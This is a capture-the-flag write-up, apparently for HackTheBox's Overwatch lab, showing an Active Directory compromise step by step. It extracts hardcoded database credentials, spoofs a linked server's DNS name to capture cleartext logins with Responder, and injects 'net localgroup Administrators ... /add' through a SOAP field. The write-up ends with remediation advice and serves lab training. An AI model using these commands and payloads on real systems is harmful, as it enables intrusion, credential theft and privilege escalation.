# HackTheBox — Overwatch (Medium, Active Directory)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`
**Domain:** `overwatch.htb`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 08:13 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.35s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 02:28:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-12T02:30:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-12T02:29:30+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-12T02:29:31
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.01 seconds
```

Standard Active Directory domain controller fingerprint (`overwatch.htb`, hostname `S200401`), running Windows Server 2022. Notably, WinRM (5985) is reachable, suggesting remote management may be possible once credentials are obtained.

### 1.2 /etc/hosts Configuration

```bash
cat /etc/hosts
```

```
10.129.xx.xx    overwatch.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

---

## 2. SMB Enumeration — Finding an Exposed Application Share

### 2.1 Listing Shares (Unauthenticated/Guest)

```bash
smbclient -L //10.129.xx.xx
```

```
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        software$       Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.xx.xx failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Beyond the standard AD shares, a custom **`software$`** share is exposed and accessible without authentication.

### 2.2 Browsing the software$ Share

```bash
smbclient //10.129.xx.xx/software$
```

```
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DH        0  Sat May 17 07:12:07 2025
  ..                                DHS        0  Thu Jan  1 12:31:47 2026
  Monitoring                         DH        0  Sat May 17 07:17:43 2025

                7147007 blocks of size 4096. 959366 blocks available
smb: \> cd Monitoring
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 07:17:43 2025
  ..                                 DH        0  Sat May 17 07:12:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 02:23:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 02:23:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 02:23:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 02:23:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 20:31:10 2017
  overwatch.exe                      AH     9728  Sat May 17 07:04:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 06:47:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 07:04:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 02:26:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 02:25:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 02:25:42 2024
  System.Data.SQLite.xml             AH  1245480  Sun Sep 29 00:33:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 20:31:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 20:31:10 2017
  x64                                DH        0  Sat May 17 07:17:33 2025
  x86                                DH        0  Sat May 17 07:17:33 2025

                7147007 blocks of size 4096. 959366 blocks available
smb: \Monitoring\> get overwatch.exe
getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (5.6 KiloBytes/sec) (average 5.6 KiloBytes/sec)
smb: \Monitoring\> get overwatch.exe.config
getting file \Monitoring\overwatch.exe.config of size 2163 as overwatch.exe.config (1.2 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \Monitoring\> get overwatch.pdb
getting file \Monitoring\overwatch.pdb of size 30208 as overwatch.pdb (16.9 KiloBytes/sec) (average 7.9 KiloBytes/sec)
```

A custom .NET monitoring application (`overwatch.exe`) along with its config and debug symbols are downloaded for offline analysis.

### 2.3 Reviewing the Application Config

```bash
cat overwatch.exe.config
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="True" />
          <serviceDebug includeExceptionDetailInFaults="True" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
  <entityFramework>
    <providers>
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
      <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
    </providers>
  </entityFramework>
  <system.data>
    <DbProviderFactories>
      <remove invariant="System.Data.SQLite.EF6" />
      <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" />
    <remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories>
  </system.data>
</configuration>
```

This reveals the application hosts a **WCF SOAP service** (`MonitoringService`/`IMonitoringService`) on `http://overwatch.htb:8000/MonitorService`, with metadata exchange enabled (`mex`) and **detailed exception info included in faults** (`includeExceptionDetailInFaults="True"`) — both useful for later interaction/abuse, and using Entity Framework against a SQL backend.

---

## 3. Static Analysis — Extracting Hardcoded Database Credentials

### 3.1 Disassembling the .NET Binary

```bash
monodis overwatch.exe > output.txt
```

### 3.2 Searching for Credentials

```bash
grep -i "ldstr" output.txt | grep -i "server\|user\|password"
```

```
        IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=<REDACTED_PASSWORD>;"
```

The connection string is hardcoded directly in the compiled IL, exposing a SQL Server account: `sqlsvc` / `<REDACTED_PASSWORD>`.

---

## 4. Database Access — MSSQL Enumeration & Linked Server Abuse

### 4.1 Connecting via impacket-mssqlclient

```bash
impacket-mssqlclient 'overwatch/sqlsvc:<REDACTED_PASSWORD>@10.129.xx.xx' -port 6520 -windows-auth
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```

The hardcoded credentials are valid and authenticate to an MSSQL instance on a non-default port (6520), running on the domain controller as a named instance (`S200401\SQLEXPRESS`).

### 4.2 Checking Privilege Level

```sql
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
```
```
-
0
```

`sqlsvc` is **not** a sysadmin — direct `xp_cmdshell` abuse isn't immediately available. Pivoting via linked servers is explored instead.

### 4.3 Enumerating Linked Servers

```sql
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC sp_linkedservers;
```
```
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
```

A second linked server, **`SQL07`**, exists — but it doesn't currently resolve via DNS, since it's not a real, registered host in this environment yet.

---

## 5. NTLM Credential Capture via DNS Spoofing + Linked Server Coercion

### 5.1 Writable AD Attributes Check

```bash
bloodyAD -u 'sqlsvc' -p '<REDACTED_PASSWORD>' -d overwatch.htb --host 10.129.xx.xx get writable
```

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=overwatch,DC=htb
permission: WRITE

distinguishedName: CN=sqlsvc,CN=Users,DC=overwatch,DC=htb
permission: WRITE
```

While `sqlsvc` doesn't have extensive write privileges across the domain, this enumeration step confirms baseline AD object access — primarily useful here is the ability to add DNS records, leveraged next.

### 5.2 Registering a Malicious DNS Record for SQL07

Since `SQL07` is a linked server name with no corresponding DNS entry, we register one pointing at our attacker machine, so any attempt by the SQL Server to connect to `SQL07` resolves to us:

```bash
bloodyAD -u 'sqlsvc' -p '<REDACTED_PASSWORD>' -d overwatch.htb --host 10.129.xx.xx add dnsRecord SQL07 10.10.xx.xx
```
```
[+] SQL07 has been successfully added
```

### 5.3 Starting Responder to Capture the Connection

```bash
sudo responder -I tun0 -v
```

```
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server                [ON]
    WPAD proxy                 [OFF]
    Auth proxy                  [OFF]
    SMB server                  [ON]
    Kerberos server             [ON]
    SQL server                  [ON]
    FTP server                  [ON]
    IMAP server                 [ON]
    POP3 server                 [ON]
    SMTP server                 [ON]
    DNS server                  [ON]
    LDAP server                 [ON]
    MQTT server                 [ON]
    RDP server                  [ON]
    DCE-RPC server              [ON]
    WinRM server                [ON]
    SNMP server                 [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.xx.xx]
    Responder IPv6             [dead:beef:4::1020]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[*] Version: Responder 3.2.0.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
```

Responder's **SQL server** module is enabled, ready to capture an MSSQL authentication attempt.

### 5.4 Triggering the Linked Server Connection

Back in the MSSQL session, a remote query is executed against the `SQL07` linked server, forcing the DC's SQL Server to connect out to our spoofed `SQL07` DNS entry:

```sql
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC ('SELECT 1') AT SQL07;
```

### 5.5 Captured Credentials

```
[+] Listening for events...

[MSSQL] Received connection from 10.129.xx.xx
[MSSQL] Cleartext Client   : 10.129.xx.xx
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : <REDACTED_PASSWORD_2>
```

Because MSSQL linked server logins using SQL authentication transmit credentials **in cleartext** when the connecting server doesn't validate the destination's identity/certificate, Responder's fake SQL server captures a full **plaintext** username/password pair for a second account, `sqlmgmt`.

---

## 6. Lateral Movement — WinRM as sqlmgmt

### 6.1 Validating the Credential

```bash
nxc winrm 10.129.xx.xx -u sqlmgmt -p <REDACTED_PASSWORD_2>
```

```
WINRM       10.129.xx.xx    5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
WINRM       10.129.xx.xx    5985   S200401          [+] overwatch.htb\sqlmgmt:<REDACTED_PASSWORD_2> (Pwn3d!)
```

### 6.2 Connecting via Evil-WinRM

```bash
evil-winrm -i 10.129.xx.xx -u sqlmgmt -p '<REDACTED_PASSWORD_2>'
```

```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents>
```

### 6.3 User Flag

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
```
```
<REDACTED_USER_FLAG>
```

---

## 7. Privilege Escalation — SOAP Command Injection in MonitoringService

### 7.1 Confirming the Service is Running

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> netstat -ano | findstr 8000
```
```
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    [::]:8000              [::]:0                 LISTENING       4
```

The `MonitorService` (the WCF service from `overwatch.exe`) is listening on port 8000, owned by PID 4 (the `System` process — i.e., it runs with high privileges).

### 7.2 Retrieving the WSDL

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> Invoke-WebRequest -UseBasicParsing -Uri "http://localhost:8000/MonitorService?wsdl"
```

```
StatusCode        : 200
StatusDescription : OK
Content           : <?xml version="1.0" encoding="utf-8"?><wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:wsx="http://schemas.xmlsoap.o...
RawContent        : HTTP/1.1 200 OK
                    Content-Length: 4478
                    Content-Type: text/xml; charset=UTF-8
                    Date: Thu, 12 Feb 2026 02:42:48 GMT
                    Server: Microsoft-HTTPAPI/2.0

                    <?xml version="1.0" encoding="utf-8"?><wsdl:definiti...
...
```

The WSDL is retrieved, exposing the service's available operations — one of which, `KillProcess`, takes a `processName` string parameter, suggesting the backend likely shells out to terminate a process by name.

### 7.3 Crafting the SOAP Request

A header specifying the target operation:

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> $headers = @{
  "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"
}
```

A malicious SOAP body, injecting an OS command via the `processName` parameter (using `;` to chain a second command, and `#` to comment out anything appended afterward by the backend):

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> $body = @'
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>test; net localgroup Administrators sqlmgmt /add #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@
```

This payload attempts to terminate a (likely non-existent) `test` process and then add the current user, `sqlmgmt`, to the local **Administrators** group.

### 7.4 Sending the Request

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> Invoke-WebRequest -UseBasicParsing `
-Uri "http://localhost:8000/MonitorService" `
-Method POST `
-Headers $headers `
-ContentType "text/xml; charset=utf-8" `
-Body $body
```

```
StatusCode        : 200
StatusDescription : OK
Content           : <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>The command completed successfully.&#xD;
                    &#xD;
                    &#xD;
                    </KillP...
RawContent        : HTTP/1.1 200 OK
                    Content-Length: 257
                    Content-Type: text/xml; charset=utf-8
                    Date: Thu, 12 Feb 2026 02:50:01 GMT
                    Server: Microsoft-HTTPAPI/2.0
...
```

The response confirms the injected command executed successfully — since the `MonitorService` process runs with elevated (SYSTEM-level) privileges, our `net localgroup` command executes with sufficient rights to modify local group membership.

### 7.5 Verifying Group Membership

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> net localgroup Administrators
```

```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
sqlmgmt
The command completed successfully.
```

`sqlmgmt` has been successfully added to the local Administrators group.

### 7.6 Re-authenticating with Elevated Privileges

A fresh session picks up the new group membership (Windows access tokens require a new logon to reflect group changes):

```bash
evil-winrm -i 10.129.xx.xx -u sqlmgmt -p '<REDACTED_PASSWORD_2>'
```

```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> whoami /groups
```

```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

`BUILTIN\Administrators` is now present in the token — local admin confirmed.

### 7.7 Root Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
```
<REDACTED_ROOT_FLAG>
```

---

## 8. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | Identified AD DC services + WinRM (5985) |
| 2 | Unauthenticated SMB enumeration | Found custom `software$` share exposing a monitoring app (`overwatch.exe`) |
| 3 | Reverse engineering (`monodis`) the .NET binary | Recovered hardcoded MSSQL credentials (`sqlsvc`) from a connection string |
| 4 | Connected to MSSQL via impacket-mssqlclient | Confirmed `sqlsvc` is non-sysadmin; enumerated linked servers (`SQL07`) |
| 5 | Registered a malicious DNS record for the unresolved linked server name `SQL07` via bloodyAD | Set up redirect to attacker machine |
| 6 | Started Responder's SQL server module, then triggered `EXEC (...) AT SQL07` | Captured cleartext linked-server credentials (`sqlmgmt`) |
| 7 | WinRM/Evil-WinRM login as `sqlmgmt` | Shell access, user flag captured |
| 8 | Identified the `MonitorService` WCF/SOAP service (port 8000, SYSTEM-owned) from earlier config analysis | Found `KillProcess` operation taking a `processName` parameter |
| 9 | Crafted a SOAP request injecting `net localgroup Administrators sqlmgmt /add` via the `processName` field | Command injection executed with SYSTEM-level privileges |
| 10 | Re-authenticated to refresh the access token | Confirmed local Administrator membership, root flag captured |

---

## 9. Tools Used

- `nmap` — port/service scanning
- `smbclient` — SMB share enumeration and file retrieval
- `monodis` — .NET assembly disassembly for static credential extraction
- `impacket-mssqlclient` — MSSQL authentication and querying
- `bloodyAD` — Active Directory object/DNS record manipulation
- `Responder` — LLMNR/NBT-NS/DNS poisoning and credential capture (specifically its SQL server module)
- `nxc` (NetExec) — WinRM credential validation
- `evil-winrm` — WinRM shell access
- PowerShell `Invoke-WebRequest` — crafting and sending the malicious SOAP request

---

## 10. Key Takeaways / Remediation

1. **Sensitive Application Files on an Unauthenticated SMB Share:** The `software$` share exposed a full deployable application — including its compiled binary, debug symbols (`.pdb`), and config — to any unauthenticated user. Deployment shares containing application binaries and configs should never be accessible without authentication, and certainly not to `Everyone`/guest.
2. **Hardcoded Database Credentials in Compiled Code:** The `sqlsvc` SQL Server credentials were embedded directly in a connection string within the .NET assembly, trivially recoverable via disassembly. Credentials should be retrieved at runtime from a secure store (e.g., Windows Credential Manager, a secrets vault, or environment-specific configuration not shipped with the binary) rather than compiled into source.
3. **Linked Server / Cleartext Authentication Exposure:** The `SQL07` linked server configuration allowed an attacker who controlled DNS resolution for that hostname to capture **cleartext credentials** via a basic Responder SQL listener, because the connecting server didn't validate the destination's identity. Linked servers should use Windows-integrated authentication where possible, and DNS records relevant to internal infrastructure should not be modifiable by low-privileged service accounts.
4. **Insufficient AD Write Restrictions for a Service Account:** The `sqlsvc` service account, though not a sysadmin, was able to create a DNS record in the domain that enabled this whole chain. Service accounts should follow least-privilege principles, with DNS zone write access tightly scoped.
5. **Privileged Service With Unsafe Command Construction (OS Command Injection):** The `MonitorService` WCF service ran as SYSTEM and passed user-supplied input (`processName`) directly into what was clearly a shell command (vulnerable to `;`/`#` injection). User input must never be concatenated directly into OS command strings; use parameterized APIs (e.g., `Process.Start` with separated arguments, or a strict allow-list of process names) instead of building shell commands from input.
6. **Excessive Privileges on a Locally-Running Service:** Running a custom monitoring service as SYSTEM (rather than a dedicated, lower-privileged service account) turned a single input-validation bug into full local privilege escalation. Services should run with the minimum privilege necessary to perform their function.
7. **Verbose Fault/Exception Details Enabled in Production:** The WCF configuration had `includeExceptionDetailInFaults="True"` set, which can leak internal implementation details (stack traces, file paths, etc.) to any caller. This setting should be disabled in production environments.

---

*Flags and other sensitive values (passwords) have been redacted. IP addresses replaced with placeholders (`10.129.xx.xx` for target, `10.10.xx.xx` for attacker/VPN) per the established convention.*
